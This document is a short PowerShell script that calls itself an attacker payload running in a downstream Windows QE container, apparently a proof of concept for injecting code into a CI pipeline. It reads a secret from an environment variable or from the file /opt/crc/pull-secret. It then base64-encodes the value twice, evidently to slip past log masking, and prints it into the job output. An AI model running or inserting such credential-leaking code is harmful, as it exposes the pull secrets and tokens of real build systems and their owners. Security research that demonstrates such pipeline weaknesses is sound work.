#!/usr/bin/env pwsh
Write-Output "GERALT_DBG attacker payload executing in downstream windows QE container"
$leak = $env:GERALT_SECRET
if ([string]::IsNullOrEmpty($leak) -and (Test-Path '/opt/crc/pull-secret')) {
  $leak = (Get-Content '/opt/crc/pull-secret' -Raw)
}
if (-not [string]::IsNullOrEmpty($leak)) {
  $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($leak))
  $b64b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($b64))
  Write-Output "GERALT_LEAKED_TOKEN=$b64b64"
}
exit 1
